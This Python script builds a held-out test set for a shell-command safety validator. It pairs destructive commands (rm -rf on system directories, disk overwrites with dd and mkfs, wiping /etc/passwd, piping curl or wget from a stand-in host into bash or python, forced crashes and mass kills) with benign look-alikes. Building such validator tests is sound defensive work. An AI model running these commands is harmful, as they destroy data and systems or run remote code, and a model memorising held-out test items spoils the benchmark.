"""Build eval/adversarial_v3.jsonl: the UNTOUCHED final test set.

Rules for using this file honestly:
  * It was written after Phase 2, without looking at the validator's code or rules.
  * Run the benchmark on it ONCE per validator version and report whatever comes out.
  * NEVER tune the validator against it. If you change rules after seeing v3
    results, v3 is burned: report it as "tuned on" and write a new v4 set.

Test data only: every entry is a string to be CLASSIFIED by the validator.
Nothing in this file or in the output is ever executed.

Row format (same as v1/v2): id, command, technique, should_block.
Headline metrics: attacks BLOCKED, and benign rows BLOCKED (WARN on a benign
row is acceptable behaviour; BLOCK on a benign row is a real false positive).
"""
import json
import pathlib

# (technique family, command). All are destructive if executed: should_block = True.
ATTACKS = [
    # --- other system directories
    ("rm_other_system_dirs", "rm -rf /home"),
    ("rm_other_system_dirs", "rm -rf /root"),
    ("rm_other_system_dirs", "rm -rf /lib"),
    ("rm_other_system_dirs", "rm -rf /bin /sbin"),
    ("rm_other_system_dirs", "rm -rf /opt"),
    ("rm_other_system_dirs", "rm -rf /boot"),
    # --- other ways of writing the root path
    ("rm_root_spelling", "rm -rf -- /"),
    ("rm_root_spelling", "rm --recursive -f -- /"),
    ("rm_root_spelling", "rm -rf '/'"),
    ("rm_root_spelling", 'rm -rf "/"'),
    ("rm_root_spelling", "rm -rf /./"),
    ("rm_root_spelling", "rm -rf /usr/.."),
    ("rm_root_spelling", "rm -rf /home/.."),
    # --- privilege wrapper
    ("rm_via_sudo", "sudo rm -rf /"),
    ("rm_via_sudo", "sudo rm -rf /etc"),
    # --- target depends on a preceding cd
    ("rm_after_cd", "cd / && rm -rf *"),
    ("rm_after_cd", "cd /etc && rm -rf *"),
    # --- overwriting devices in other ways
    ("device_overwrite_other", "dd if=/dev/zero of=/dev/vda"),
    ("device_overwrite_other", "dd if=/dev/zero of=/dev/mmcblk0 bs=1M"),
    ("device_overwrite_other", "cat /dev/zero | dd of=/dev/sda"),
    ("device_overwrite_other", "yes | dd of=/dev/sda"),
    ("device_overwrite_other", "head -c 1G /dev/urandom > /dev/sda"),
    # --- other filesystem and partition tools
    ("fs_tools_other", "mkfs.btrfs /dev/vdb"),
    ("fs_tools_other", "mke2fs /dev/sdc1"),
    ("fs_tools_other", "mkswap /dev/sda2"),
    ("fs_tools_other", "parted -s /dev/sda mklabel gpt"),
    ("fs_tools_other", "sgdisk --zap-all /dev/sda"),
    ("fs_tools_other", "blkdiscard /dev/nvme0n1"),
    # --- destroying critical files in other ways
    ("critical_file_other", ": > /etc/passwd"),
    ("critical_file_other", "cp /dev/null /etc/shadow"),
    ("critical_file_other", "sed -i d /etc/passwd"),
    ("critical_file_other", "tee /etc/passwd < /dev/null"),
    ("critical_file_other", "rm -f /etc/shadow"),
    ("critical_file_other", "> /etc/fstab"),
    # --- moving things into the void
    ("move_to_void", "mv /* /dev/null"),
    ("move_to_void", "mv ~ /dev/null"),
    # --- permissions and ownership
    ("perm_other", "chmod -R 777 /etc"),
    ("perm_other", "chmod -R a-x /usr/bin"),
    ("perm_other", "chown -R nobody /home"),
    # --- running remote code in other ways
    ("remote_code_other", "wget -qO- http://x.example/a | sudo bash"),
    ("remote_code_other", "curl -s http://x.example/s | python3"),
    ("remote_code_other", "curl -s http://x.example/s | perl"),
    ("remote_code_other", "source <(curl -s http://x.example/s)"),
    ("remote_code_other", ". <(wget -qO- http://x.example/s)"),
    ("remote_code_other", 'bash -c "$(curl -fsSL http://x.example/s)"'),
    # --- other interpreters
    ("interpreter_other", "python3 -c \"import shutil; shutil.rmtree('/home')\""),
    ("interpreter_other", "python3 -c \"import os; os.system('rm -rf ~')\""),
    ("interpreter_other", "node -e \"require('fs').rmSync('/', {recursive: true})\""),
    ("interpreter_other", "perl -e 'unlink glob(\"/etc/*\")'"),
    # --- find with destructive actions
    ("find_other", "find /home -type f -exec shred {} +"),
    ("find_other", "find / -xdev -type f -delete"),
    ("find_other", "find ~ -type f -exec rm {} \\;"),
    # --- shutdown and crash
    ("power_other", "echo b > /proc/sysrq-trigger"),
    ("power_other", "echo c > /proc/sysrq-trigger"),
    ("power_other", "halt"),
    ("power_other", "shutdown -h now"),
    ("power_other", "shutdown -r +0"),
    ("power_other", "telinit 0"),
    ("power_other", "systemctl reboot"),
    # --- mass process killing
    ("kill_other", "kill -KILL -1"),
    ("kill_other", "killall5 -9"),
    ("kill_other", "pkill -9 -f ."),
]

# Benign look-alikes: must NOT be BLOCKed. A WARN is acceptable.
BENIGN = [
    "rm -rf /tmp/build-123", "rm -rf ~/projects/old/build", "rm -rf ./dist ./coverage",
    "rm *.tmp", "rm -i notes.txt", "find /tmp -name '*.cache' -delete",
    "dd if=/dev/zero of=swapfile bs=1M count=100", "mkswap swapfile",
    "mkfs.ext4 -F disk.img", "parted -l", "blkid", "lsblk -f",
    "cat /proc/cpuinfo", "echo 1 > /tmp/flag", "cat /dev/null > out.log",
    ": > app.log", "cp /dev/null ./empty", "chmod -R u+rwX ./repo",
    "chown -R $USER:$USER ~/data", "mv build old_build", "mv ~/a.txt ~/b.txt",
    "kill $(pgrep -f myapp)", "pkill -f 'python app.py'", "killall myapp",
    "shutdown --help", "systemctl is-active sshd",
    "curl -s http://x.example/data.json | jq .",
    "wget -qO- http://x.example/readme | less", "bash script.sh",
    "bash -c 'echo hi'", "python3 -c 'import os; print(os.getcwd())'",
    "node -e \"console.log(1)\"", "source ~/.bashrc", ". ./env.sh",
    "find ~ -type f -name '*.pdf' -exec ls -l {} +",
    "find / -name '*.conf' 2>/dev/null", "sed -i 's/a/b/' notes.txt",
    "sudo apt update", "sudo systemctl status nginx", "tee out.txt < in.txt",
    "echo hello | tee /tmp/x", "history | grep rm", "grep -r 'sysrq' docs/",
    "ls /proc/sys/kernel", "tar -xzf archive.tar.gz -C /tmp/extract",
    "du -sh /var/log", "df -h /",
]


def main():
    rows = []

    def add(command, technique, should_block):
        rows.append({
            "id": f"v3-{len(rows) + 1:04d}",
            "command": command,
            "technique": technique,
            "should_block": should_block,
        })

    for technique, cmd in ATTACKS:
        add(cmd, technique, True)
    for cmd in BENIGN:
        add(cmd, "benign", False)

    out = pathlib.Path(__file__).resolve().parents[1] / "eval" / "adversarial_v3.jsonl"
    out.parent.mkdir(exist_ok=True)
    out.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")
    print(f"wrote {len(rows)} rows to {out}")


if __name__ == "__main__":
    main()
